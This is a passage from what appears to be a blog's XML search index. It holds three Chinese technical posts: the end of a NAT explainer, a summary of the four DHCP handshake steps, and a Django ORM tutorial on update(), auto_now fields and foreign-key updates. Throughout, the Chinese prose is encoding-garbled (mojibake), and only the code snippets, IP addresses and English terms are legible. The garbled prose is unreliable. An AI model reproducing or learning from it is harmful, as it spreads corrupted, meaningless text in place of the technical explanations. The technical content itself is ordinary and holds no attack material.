å°„å…³ç³»ï¼›<br>å­˜åœ¨é—®é¢˜ï¼šåŒä¸€æ—¶é—´è®¿é—®å…¬ç½‘çš„ä¸»æœºæ•°é‡å¤šæ—¶ï¼Œå°±éœ€è¦å¯¹åº”æ•°é‡çš„å…¬ç½‘IPäº†ã€‚</p><h4 id="åŒå‘ï¼ˆå‘å†…ï¼‰NATï¼šIPåœ°å€é™æ€æ˜ å°„"><a href="#åŒå‘ï¼ˆå‘å†…ï¼‰NATï¼šIPåœ°å€é™æ€æ˜ å°„" class="headerlink" title="åŒå‘ï¼ˆå‘å†…ï¼‰NATï¼šIPåœ°å€é™æ€æ˜ å°„"></a>åŒå‘ï¼ˆå‘å†…ï¼‰NATï¼šIPåœ°å€é™æ€æ˜ å°„</h4><p>ä½¿ç”¨åœºæ™¯ï¼šå½“å…¬ç½‘ä¸»æœºæƒ³ä¸»åŠ¨è®¿é—®ä¸€ä¸ªå†…ç½‘IPçš„æ—¶å€™ï¼Œå•å‘NATå’ŒNAPTæŠ€æœ¯éƒ½æ— æ³•å®ç°ï¼Œåªèƒ½ä¾é åŒå‘NATæŠ€æœ¯ï¼›<br>åŸç†ï¼šNATè·¯ç”±å™¨ä¼šå°†å†…ç½‘IPå’Œå‡ºå£å…¬ç½‘IPåšä¸€ä¸ªé™æ€éƒ½æ˜ å°„è®°å½•ï¼Œè®¿é—®å‡ºå£å…¬ç½‘IPéƒ½å°†æ˜ å°„éƒ½å†…ç½‘IPä¸Šã€‚<br>ç¼ºç‚¹ï¼šæ— æ³•ä½¿ç”¨ç«¯å£æ˜ å°„ï¼Œä½¿ç”¨åœºæ™¯è¾ƒå°‘ã€‚</p><h3 id="NAPTç«¯å£æ˜ å°„ï¼ˆNetwork-Address-Port-Translationï¼‰"><a href="#NAPTç«¯å£æ˜ å°„ï¼ˆNetwork-Address-Port-Translationï¼‰" class="headerlink" title="NAPTç«¯å£æ˜ å°„ï¼ˆNetwork Address Port Translationï¼‰"></a>NAPTç«¯å£æ˜ å°„ï¼ˆNetwork Address Port Translationï¼‰</h3><p>åŸç†ï¼šå¦‚æœ¬åœ°ç”µè„‘è®¿é—®çŸ¥ä¹ï¼Œæœ¬åœ°å®¢æˆ·ç«¯ä¼šå’ŒçŸ¥ä¹æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªTCPè¿æ¥ï¼Œæ“ä½œç³»ç»Ÿä½¿ç”¨å¦‚7000ç«¯å£å’Œæœ¬æœºIPï¼ˆ172.18.68.69ï¼‰ä½œä¸ºæºIPç«¯å£ï¼Œç›®çš„IPç«¯å£ä¸º103.41.167.234:80ï¼›NATè·¯ç”±å™¨åˆ™ä¼šæŠŠæºIPæ˜ å°„ä¸ºè·¯ç”±å™¨ä¸Šå‡ºå£çš„å…¬ç½‘IP194.54.21.7ï¼Œå¹¶å°†æºç«¯å£ä¿®æ”¹ä¸ºä¸€ä¸ªéšæœºçš„å¦‚7224ç«¯å£ï¼ˆè¿™é‡Œè·¯ç”±å™¨ä¿®æ”¹äº†ä¼ è¾“å±‚çš„æ•°æ®ï¼‰ï¼Œå‘é€å¾€æœåŠ¡å™¨ï¼Œå†æœåŠ¡å™¨å‘å›æ•°æ®åŒ…åï¼Œåœ¨é€šè¿‡æ˜ å°„è®°å½•ï¼Œä¿®æ”¹å‘å¾€æœ¬åœ°çš„ç›®çš„IPå’Œç«¯å£ï¼Œä»è€Œå®ç°å¤šå°ä¸»æœºå…¬ç”¨ä¸€ä¸ªå…¬ç½‘IPã€‚</p><h3 id="NATæŠ€æœ¯ä¼˜ç¼ºç‚¹"><a href="#NATæŠ€æœ¯ä¼˜ç¼ºç‚¹" class="headerlink" title="NATæŠ€æœ¯ä¼˜ç¼ºç‚¹"></a>NATæŠ€æœ¯ä¼˜ç¼ºç‚¹</h3><h4 id="ä¼˜ç‚¹ï¼š"><a href="#ä¼˜ç‚¹ï¼š" class="headerlink" title="ä¼˜ç‚¹ï¼š"></a>ä¼˜ç‚¹ï¼š</h4><p>å…±äº«å…¬å…±IPåœ°å€ï¼ŒèŠ‚çº¦å¼€æ”¯<br>æ‰©å±•ä¸»æœºæ—¶ä¸æ¶‰åŠå…¬å…±åœ°å€<br>æ›´æ¢ISPæœåŠ¡å•†ä¸ä¼šå¯¹ä¸»æœºåœ°å€äº§ç”Ÿå½±å“<br>æ›´å¥½éƒ½å®‰å…¨æ€§ï¼Œå¤–ç½‘æœåŠ¡æ— æ³•ä¸»åŠ¨è®¿é—®å†…ç½‘æœåŠ¡<br>æ›´å¥½éƒ½éš”ç¦»æ€§</p><h4 id="ç¼ºç‚¹ï¼š"><a href="#ç¼ºç‚¹ï¼š" class="headerlink" title="ç¼ºç‚¹ï¼š"></a>ç¼ºç‚¹ï¼š</h4><p>ç½‘ç»œç®¡ç†å¤æ‚<br>æ€§èƒ½ä¸‹é™ï¼Œæ¯ä¸ªæ•°æ®åŒ…éƒ½è¦è¿›è¡Œæº/ç›®IPç«¯å£éƒ½ä¿®æ”¹<br>é‡æ–°ä¿®æ”¹æ ¡éªŒå’Œï¼Œå› ä¸ºæ•°æ®åŒ…å†…å®¹è¢«ä¿®æ”¹<br>å®¢æˆ·ç«¯ç¼ºä¹å…¬ç½‘IPå¯¼è‡´ä¸€äº›åŠŸèƒ½ç¼ºå¤±</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>NAT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€Šè¶£è°ˆç½‘ç»œåè®®ã€‹å­¦ä¹ æ€»ç»“ï¼š1-4è®²</title>
    <link href="/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/"/>
    <url>/2020/09/05/%E3%80%8A%E8%B6%A3%E8%B0%88%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%EF%BC%9A1-4%E8%AE%B2/</url>
    
    <content type="html"><![CDATA[<h3 id="æ€»ç»“-æ€è€ƒï¼š"><a href="#æ€»ç»“-æ€è€ƒï¼š" class="headerlink" title="æ€»ç»“/æ€è€ƒï¼š"></a>æ€»ç»“/æ€è€ƒï¼š</h3><p>ç¬¬å››è®²ä¸­å…³äºDHCPçš„å…·ä½“å®ç°è¿‡ç¨‹è®²çš„æ¯”è¾ƒæŠ½è±¡ï¼Œäºæ˜¯ä¸Šç½‘googleäº†ä¸€ä¸‹å…·ä½“çš„æµç¨‹</p><h4 id="DHCPçš„å®ç°"><a href="#DHCPçš„å®ç°" class="headerlink" title="DHCPçš„å®ç°"></a>DHCPçš„å®ç°</h4><p>DHCPå®ç°å¤§è‡´åˆ†ä¸º4æ­¥<br>ç¬¬ä¸€æ­¥ï¼šClientç«¯åœ¨å±€åŸŸç½‘å†…å‘èµ·ä¸€ä¸ªDHCPã€€DiscoveråŒ…ï¼Œç›®çš„æ˜¯æƒ³å‘ç°èƒ½å¤Ÿç»™å®ƒæä¾›IPçš„DHCP Serverã€‚<br>æ•°æ®åŒ…å†…å®¹ï¼šClientç«¯ä½¿ç”¨IPåœ°å€0.0.0.0å‘é€ä¸€ä¸ªç›®çš„IPåœ°å€ä½255.255.255.255çš„å¹¿æ’­åŒ…ï¼Œä½¿ç”¨çš„åè®®ä¸ºUDPåè®®ã€‚</p><p>ç¬¬äºŒæ­¥ï¼šå¯ç”¨çš„DHCP Serveræ¥æ”¶åˆ°DiscoveråŒ…ä¹‹åï¼Œé€šè¿‡å‘é€DHCP OfferåŒ…ç»™äºˆClientç«¯åº”ç­”ï¼Œæ„åœ¨å‘Šè¯‰Clientç«¯å®ƒå¯ä»¥æä¾›IPåœ°å€ã€‚<br>æ•°æ®åŒ…å†…å®¹ï¼š<br>ï¼ˆ1ï¼‰DHCPæœåŠ¡å™¨ä»ç„¶ä½¿ç”¨å¹¿æ’­åœ°å€ä½œä¸ºç›®çš„åœ°å€ï¼Œå› ä¸ºæ­¤æ—¶è¯·æ±‚åˆ†é…IPçš„Clientå¹¶æ²¡æœ‰è‡ªå·±ip,è€Œå¯èƒ½æœ‰å¤šä¸ªClientåœ¨ä½¿ç”¨0.0.0.0è¿™ä¸ªIPä½œä¸ºæºIPå‘DHCPæœåŠ¡å™¨å‘å‡ºIPåˆ†é…è¯·æ±‚ï¼ŒDHCPä¹Ÿä¸èƒ½ä½¿ç”¨0.0.0.0è¿™ä¸ªIPä½œä¸ºç›®çš„IPåœ°å€ï¼Œäºæ˜¯ä¾ç„¶é‡‡ç”¨å¹¿æ’­çš„æ–¹å¼ï¼Œå‘Šè¯‰æ­£åœ¨è¯·æ±‚çš„Clientä»¬ï¼Œè¿™æ˜¯ä¸€å°å¯ä»¥ä½¿ç”¨çš„DHCPæœåŠ¡å™¨ã€‚<br>ï¼ˆ2ï¼‰DHCPæœåŠ¡å™¨æä¾›äº†ä¸€ä¸ªå¯ç”¨çš„IP,åœ¨æ•°æ®åŒ…çš„Your (client) IP Addresså­—æ®µå¯ä»¥çœ‹åˆ°DHCPæœåŠ¡å™¨æä¾›çš„å¯ç”¨IPã€‚<br>ï¼ˆ3ï¼‰é™¤æ­¤ä¹‹å¤–ï¼Œå¦‚å›¾ä¸­çº¢è‰²çŸ©å½¢æ¡†çš„å†…å®¹æ‰€ç¤ºï¼ŒæœåŠ¡å™¨è¿˜å‘é€äº†å­ç½‘æ©ç ï¼Œè·¯ç”±å™¨ï¼ŒDNSï¼ŒåŸŸåï¼ŒIPåœ°å€ç§Ÿç”¨æœŸç­‰ä¿¡æ¯ã€‚</p><p>ç¬¬ä¸‰æ­¥ï¼šClientç«¯æ¥æ”¶åˆ°OfferåŒ…ä¹‹åï¼Œå‘é€DHCP RequeståŒ…è¯·æ±‚åˆ†é…IPã€‚<br>æ•°æ®åŒ…å†…å®¹ï¼šå½“Clientæ”¶åˆ°äº†DHCP OfferåŒ…ä»¥åï¼ˆå¦‚æœæœ‰å¤šä¸ªå¯ç”¨çš„DHCPæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šæ”¶åˆ°å¤šä¸ªDHCP OfferåŒ…ï¼‰ï¼Œç¡®è®¤æœ‰å¯ä»¥å’Œå®ƒäº¤äº’çš„DHCPæœåŠ¡å™¨å­˜åœ¨ï¼Œäºæ˜¯Clientå‘é€Requestæ•°æ®åŒ…ï¼Œè¯·æ±‚åˆ†é…IPã€‚<br>æ­¤æ—¶çš„æºIPå’Œç›®çš„IPä¾ç„¶æ˜¯0.0.0.0å’Œ255.255.255.255ã€‚åŒ…ä¸­åŒ…å«å®¢æˆ·ç«¯çš„MACåœ°å€ã€æ¥å—çš„ç§Ÿçº¦ä¸­çš„IPåœ°å€ã€æä¾›æ­¤ç§Ÿçº¦çš„DHCPæœåŠ¡å™¨åœ°å€ç­‰ï¼‰ã€‚å‘Šè¯‰æ‰€æœ‰DHCPæœåŠ¡å™¨å®ƒå°†æ¥å—å“ªä¸€å°æœåŠ¡å™¨ï¼ˆä¸€èˆ¬æ˜¯æœ€å…ˆåˆ°è¾¾çš„serverï¼‰æä¾›çš„IPåœ°å€ï¼Œæ‰€æœ‰å…¶ä»–çš„DHCPæœåŠ¡å™¨æ’¤é”€å®ƒä»¬çš„æä¾›ä»¥ä¾¿å°†IPåœ°å€æä¾›ç»™ä¸‹ä¸€æ¬¡IPç§Ÿç”¨è¯·æ±‚ã€‚</p><p>ç¬¬å››æ­¥ï¼šDHCP Serverå‘é€ACKæ•°æ®åŒ…ï¼Œç¡®è®¤ä¿¡æ¯ã€‚<br>æ•°æ®åŒ…å†…å®¹ï¼šåœ¨æ•°æ®åŒ…ä¸­åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼Œè¡¨ç¤ºå°†è¿™äº›èµ„æºä¿¡æ¯åˆ†é…ç»™Client.<br>Your(client) IP address:åˆ†é…ç»™Clientçš„å¯ç”¨IPã€‚<br>åé¢æœ‰è®¸å¤šé¡¹optionä¿¡æ¯ï¼Œå‰ä¸¤é¡¹æ˜¯DHCPæœåŠ¡å™¨å‘é€çš„æ¶ˆæ¯ç±»å‹ï¼ˆACKï¼‰å’ŒæœåŠ¡å™¨çš„èº«ä»½æ ‡è¯†ï¼Œåé¢å‡ é¡¹æ˜¯ï¼š<br>Subnet Mask:Clientç«¯åˆ†é…åˆ°çš„IPçš„å­ç½‘æ©ç ï¼›<br>Router:è·¯ç”±å™¨<br>Domain Name Server:DNS,åŸŸåæœåŠ¡å™¨<br>Domain Name:åŸŸå<br>IP Address Lease Time:IPç§Ÿç”¨æœŸã€‚</p><p>åç»­ï¼šå®¢æˆ·ç«¯åœ¨æ¥æ”¶åˆ°DHCP ackå¹¿æ’­åï¼Œä¼šå‘ç½‘ç»œå‘é€ä¸‰ä¸ªé’ˆå¯¹æ­¤IPåœ°å€çš„ARPè§£æè¯·æ±‚ä»¥æ‰§è¡Œå†²çªæ£€æµ‹ï¼ŒæŸ¥è¯¢ç½‘ç»œä¸Šæœ‰æ²¡æœ‰å…¶å®ƒæœºå™¨ä½¿ç”¨è¯¥IPåœ°å€ï¼›å¦‚æœå‘ç°è¯¥IPåœ°å€å·²ç»è¢«ä½¿ç”¨ï¼Œå®¢æˆ·æœºä¼šå‘å‡ºä¸€ä¸ªDHCP declineæ•°æ®åŒ…ç»™DHCPæœåŠ¡å™¨ï¼Œæ‹’ç»æ­¤IPåœ°å€ç§Ÿçº¦ï¼Œå¹¶é‡æ–°å‘é€DHCP discoverä¿¡æ¯ã€‚æ­¤æ—¶ï¼Œåœ¨DHCPæœåŠ¡å™¨ç®¡ç†æ§åˆ¶å°ä¸­ï¼Œä¼šæ˜¾ç¤ºæ­¤IPåœ°å€ä¸ºBAD_ADDRESSã€‚<br>å¦‚æœç½‘ç»œä¸Šæ²¡æœ‰å…¶å®ƒä¸»æœºä½¿ç”¨æ­¤IPåœ°å€ï¼Œåˆ™å®¢æˆ·æœºçš„TCP/IPä½¿ç”¨ç§Ÿçº¦ä¸­æä¾›çš„IPåœ°å€å®Œæˆåˆå§‹åŒ–ï¼Œä»è€Œå¯ä»¥å’Œå…¶ä»–ç½‘ç»œä¸­çš„ä¸»æœºè¿›è¡Œé€šè®¯ã€‚</p><h4 id="DHCPç¼ºç‚¹ï¼š"><a href="#DHCPç¼ºç‚¹ï¼š" class="headerlink" title="DHCPç¼ºç‚¹ï¼š"></a>DHCPç¼ºç‚¹ï¼š</h4><p>1.DHCPä¸èƒ½æŸ¥å‡ºç½‘ç»œä¸ŠéDHCPå®¢æˆ·æœºå·²ç»åœ¨ä½¿ç”¨çš„IPåœ°å€ï¼Œä¾‹å¦‚ç½‘ç»œæœ‰ä¸€éDHCPå®¢æˆ·æœºAå·²ç»æ‰‹å·¥åˆ†é…äº†IPåœ°å€:100.53.46.5ï¼Œä½†æ˜¯DHCPæœåŠ¡å™¨å¹¶ä¸èƒ½è¯†åˆ«å‡ºè¯¥åœ°å€å·²ç»è¢«åˆ†é…äº†ï¼Œå®ƒå‘DHCPå®¢æˆ·æœºé…äº†ä¸€ä¸ªé‡å¤çš„IPåœ°å€:100.53.46.5ï¼Œè¿™å°±å¯¼è‡´äº†IPåœ°å€çš„å†²çªã€‚å½“ç„¶ï¼Œè¿™äº›IPåœ°å€å¯ä»¥ä»è¢«é…ç½®åœ¨DHCPæœåŠ¡å™¨ä¸Šçš„ä»»ä½•èŒƒå›´ä¸­æ’é™¤ã€‚<br>2.å½“ç½‘ç»œä¸Šå­˜åœ¨ä¸¤ä¸ªDHCPæœåŠ¡å™¨æ—¶ï¼Œä¸€ä¸ªDHCPæœåŠ¡å™¨ä¸å’Œå¦ä¸€ä¸ªDHCPæœåŠ¡å™¨é€šä¿¡ï¼Œå°±ä¸èƒ½æŸ¥å‡ºå·²è¢«å…¶ä»–æœåŠ¡å™¨ç§Ÿå‡ºå»çš„IPåœ°å€ã€‚å› æ­¤ï¼Œä¸¤ä¸ªDHCPæœåŠ¡å™¨ä¸åº”è¯¥åœ¨å®ƒä»¬å„è‡ªçš„èŒƒå›´ä¸­ä½¿ç”¨ç›¸åŒçš„IPåœ°å€ã€‚æ­¤å¤–ï¼ŒDHCPæœåŠ¡å™¨ä¸èƒ½è·¨è·¯ç”±å™¨ä¸å®¢æˆ·æœºé€šä¿¡ï¼Œé™¤éè·¯ç”±å™¨å…è®¸BOOTPè½¬å‘ï¼Œæˆ–è€…å­ç½‘å…è®¸DHCPä¸­è½¬å€Ÿã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘ç»œ</category>
      
      <category>DHCP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç½‘ç»œ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Django modelç¯‡ï¼ˆä¸€ï¼‰ï¼šupdateç”¨æ³•ä»‹ç»</title>
    <link href="/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/06/12/Django%20model%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9Aupdate%E7%94%A8%E6%B3%95%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h3 id="model-updateå¸¸ç”¨æ–¹æ³•"><a href="#model-updateå¸¸ç”¨æ–¹æ³•" class="headerlink" title="model updateå¸¸ç”¨æ–¹æ³•"></a>model updateå¸¸ç”¨æ–¹æ³•</h3><p>æ–¹æ³•ä¸€ï¼š</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(username=<span class="hljs-string">'tachiulam'</span>,is_active=<span class="hljs-literal">True</span>)</code></pre><p>æ–¹æ³•äºŒï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><p>æ–¹æ³•ä¸€é€‚åˆæ›´æ–°ä¸€æ‰¹æ•°æ®ï¼Œç±»ä¼¼äºmysqlè¯­å¥update user set username=â€™tachiulamâ€™ where id = 1</p><p>æ–¹æ³•äºŒé€‚åˆæ›´æ–°ä¸€æ¡æ•°æ®ï¼Œä¹Ÿåªèƒ½æ›´æ–°ä¸€æ¡æ•°æ®ï¼Œå½“åªæœ‰ä¸€æ¡æ•°æ®æ›´æ–°æ—¶æ¨èä½¿ç”¨æ­¤æ–¹æ³•ï¼Œå¦å¤–æ­¤æ–¹æ³•è¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œæˆ‘ä»¬æ¥ç€å¾€ä¸‹çœ‹</p><h3 id="å…·æœ‰auto-nowå±æ€§å­—æ®µçš„æ›´æ–°"><a href="#å…·æœ‰auto-nowå±æ€§å­—æ®µçš„æ›´æ–°" class="headerlink" title="å…·æœ‰auto_nowå±æ€§å­—æ®µçš„æ›´æ–°"></a>å…·æœ‰auto_nowå±æ€§å­—æ®µçš„æ›´æ–°</h3><p>æˆ‘ä»¬é€šå¸¸ä¼šç»™è¡¨æ·»åŠ ä¸‰ä¸ªé»˜è®¤å­—æ®µ</p><ul><li><p>è‡ªå¢IDï¼Œè¿™ä¸ªdjangoå·²ç»é»˜è®¤åŠ äº†ï¼Œå°±åƒä¸Šè¾¹çš„å»ºè¡¨è¯­å¥ï¼Œè™½ç„¶åªå†™äº†usernameå’Œis_activeä¸¤ä¸ªå­—æ®µï¼Œä½†è¡¨å»ºå¥½åä¹Ÿä¼šæœ‰ä¸€ä¸ªé»˜è®¤çš„è‡ªå¢idå­—æ®µ</p></li><li><p>åˆ›å»ºæ—¶é—´ï¼Œç”¨æ¥æ ‡è¯†è¿™æ¡è®°å½•çš„åˆ›å»ºæ—¶é—´ï¼Œå…·æœ‰auto_now_addå±æ€§ï¼Œåˆ›å»ºè®°å½•æ—¶ä¼šè‡ªåŠ¨å¡«å……å½“å‰æ—¶é—´åˆ°æ­¤å­—æ®µ</p></li><li><p>ä¿®æ”¹æ—¶é—´ï¼Œç”¨æ¥æ ‡è¯†è¿™æ¡è®°å½•æœ€åä¸€æ¬¡çš„ä¿®æ”¹æ—¶é—´ï¼Œå…·æœ‰auto_nowå±æ€§ï¼Œå½“è®°å½•å‘ç”Ÿå˜åŒ–æ—¶å¡«å……å½“å‰æ—¶é—´åˆ°æ­¤å­—æ®µ<br>å°±åƒä¸‹è¾¹è¿™æ ·çš„è¡¨ç»“æ„</p></li></ul><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'æ›´æ–°æ—¶é—´'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç”¨æˆ·å'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'æ¿€æ´»çŠ¶æ€'</span>)</code></pre><p>å½“è¡¨æœ‰å­—æ®µå…·æœ‰auto_nowå±æ€§ä¸”ä½ å¸Œæœ›ä»–èƒ½è‡ªåŠ¨æ›´æ–°æ—¶ï¼Œå¿…é¡»ä½¿ç”¨ä¸Šè¾¹æ–¹æ³•äºŒçš„æ›´æ–°ï¼Œä¸ç„¶auto_nowå­—æ®µä¸ä¼šæ›´æ–°ï¼Œä¹Ÿå°±æ˜¯ï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.username=<span class="hljs-string">'tachiulam'</span>_t.is_active=<span class="hljs-literal">True</span>_t.save()</code></pre><h3 id="json-dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ"><a href="#json-dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ" class="headerlink" title="json/dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ"></a>json/dictç±»å‹æ•°æ®æ›´æ–°å­—æ®µ</h3><p>ç›®å‰ä¸»æµçš„webå¼€æ”¾æ–¹å¼éƒ½è®²ç©¶å‰åç«¯åˆ†ç¦»ï¼Œåˆ†ç¦»ä¹‹åå‰åç«¯äº¤äº’çš„æ•°æ®æ ¼å¼å¤§éƒ½ç”¨é€šç”¨çš„jsonå‹ï¼Œé‚£ä¹ˆå¦‚ä½•ç”¨æœ€å°‘çš„ä»£ç æ–¹ä¾¿çš„æ›´æ–°jsonæ ¼å¼æ•°æ®åˆ°æ•°æ®åº“å‘¢ï¼ŸåŒæ ·å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä¸¤ç§æ–¹æ³•ï¼š</p><p>æ–¹æ³•ä¸€ï¼š</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;User.objects.filter(id=<span class="hljs-number">1</span>).update(**data)</code></pre><ul><li><p>åŒæ ·è¿™ç§æ–¹æ³•ä¸èƒ½è‡ªåŠ¨æ›´æ–°å…·æœ‰auto_nowå±æ€§å­—æ®µçš„å€¼</p></li><li><p>é€šå¸¸æˆ‘ä»¬å†å˜é‡å‰åŠ ä¸€ä¸ªæ˜Ÿå·(*)è¡¨ç¤ºè¿™ä¸ªå˜é‡æ˜¯å…ƒç»„/åˆ—è¡¨ï¼ŒåŠ ä¸¤ä¸ªæ˜Ÿå·è¡¨ç¤ºè¿™ä¸ªå‚æ•°æ˜¯å­—å…¸</p></li></ul><p>æ–¹æ³•äºŒï¼š</p><pre><code class="hljs python">data = &#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'is_active'</span>:<span class="hljs-string">'0'</span>&#125;_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**data)_t.save()</code></pre><ul><li><p>æ–¹æ³•äºŒå’Œæ–¹æ³•ä¸€åŒæ ·æ— æ³•è‡ªåŠ¨æ›´æ–°auto_nowå­—æ®µçš„å€¼</p></li><li><p>æ³¨æ„è¿™é‡Œä½¿ç”¨åˆ°äº†ä¸€ä¸ªdictæ–¹æ³•</p></li></ul><p>æ–¹æ³•ä¸‰ï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><h3 id="ForeignKeyå­—æ®µæ›´æ–°"><a href="#ForeignKeyå­—æ®µæ›´æ–°" class="headerlink" title="ForeignKeyå­—æ®µæ›´æ–°"></a>ForeignKeyå­—æ®µæ›´æ–°</h3><p>å‡å¦‚æˆ‘ä»¬çš„è¡¨ä¸­æœ‰Foreignkeyå¤–é”®æ—¶ï¼Œè¯¥å¦‚ä½•æ›´æ–°å‘¢ï¼Ÿ</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'åˆ›å»ºæ—¶é—´'</span>)    update_time = models.DateTimeField(auto_now=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'æ›´æ–°æ—¶é—´'</span>)    username = models.CharField(max_length=<span class="hljs-number">255</span>, unique=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'ç”¨æˆ·å'</span>)    is_active = models.BooleanField(default=<span class="hljs-literal">False</span>, verbose_name=<span class="hljs-string">'æ¿€æ´»çŠ¶æ€'</span>)    role = models.ForeignKey(Role, on_delete=models.CASCADE, null=<span class="hljs-literal">True</span>, verbose_name=<span class="hljs-string">'è§’è‰²'</span>)</code></pre><p>æ–¹æ³•ä¸€ï¼š</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(role=<span class="hljs-number">2</span>)</code></pre><ul><li><p>æœ€ç®€å•çš„æ–¹æ³•ï¼Œç›´æ¥è®©ç»™roleå­—æ®µè®¾ç½®ä¸ºä¸€ä¸ªidå³å¯</p></li><li><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨dictä½œä¸ºå‚æ•°æ›´æ–°ï¼š</p><pre><code class="hljs python">User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:<span class="hljs-number">3</span>&#125;)</code></pre></li></ul><p>æ–¹æ³•äºŒï¼š</p><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">2</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(role=_role)</code></pre><ul><li><p>ä¹Ÿå¯ä»¥èµ‹å€¼ä¸€ä¸ªå®ä¾‹ç»™role</p></li><li><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨dictä½œä¸ºå‚æ•°æ›´æ–°ï¼š</p></li></ul><pre><code class="hljs python">_role = Role.objects.get(id=<span class="hljs-number">1</span>)User.objects.filter(id=<span class="hljs-number">1</span>).update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role'</span>:_role&#125;)</code></pre><p>æ–¹æ³•ä¸‰ï¼š</p><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.role=Role.objects.get(id=<span class="hljs-number">3</span>)_t.save()</code></pre><ul><li><p>æ³¨æ„ï¼šè¿™é‡Œçš„roleå¿…é¡»èµ‹å€¼ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä¸èƒ½å†™idï¼Œä¸ç„¶ä¼šæŠ¥é”™â€User.roleâ€ must be a â€œRoleâ€ instance</p></li><li><p>å½“ä½¿ç”¨dictä½œä¸ºå‚æ•°æ›´æ–°æ—¶åˆæœ‰ä¸€ç‚¹ä¸åŒï¼Œå¦‚ä¸‹ä»£ç ï¼š</p></li></ul><pre><code class="hljs python">_t = User.objects.get(id=<span class="hljs-number">1</span>)_t.__dict__.update(**&#123;<span class="hljs-string">'username'</span>:<span class="hljs-string">'tachiulam'</span>,<span class="hljs-string">'role_id'</span>:<span class="hljs-number">2</span>&#125;)_t.save()</code></pre><ul><li><p>Foreignkeyå¤–é”®å¿…é¡»åŠ ä¸Š<code>_id</code>ï¼Œä¾‹å¦‚ï¼š{â€˜role_idâ€™:3}</p></li><li><p>role_idåè¾¹å¿…é¡»è·Ÿä¸€ä¸ªidï¼ˆintæˆ–strç±»å‹éƒ½å¯ï¼‰ï¼Œä¸èƒ½è·Ÿroleå®ä¾‹</p></li></ul><h3 id="ManyToManyFieldå­—æ®µæ›´æ–°"><a href="#ManyToManyFieldå­—æ®µæ›´æ–°" class="headerlink" title="ManyToManyFieldå­—æ®µæ›´æ–°"></a>ManyToManyFieldå­—æ®µæ›´æ–°</h3><p>å‡å¦‚æˆ‘ä»¬çš„è¡¨ä¸­æœ‰ManyToManyFieldå­—æ®µæ—¶æ›´æ–°åˆæœ‰ä»€ä¹ˆå½±å“å‘¢ï¼Ÿ</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span><span class="hljs-params">(models.Model)</span>:</span>    create_time = models.DateTimeField(auto_now_add=<span class="hljs-literal">True</span>, 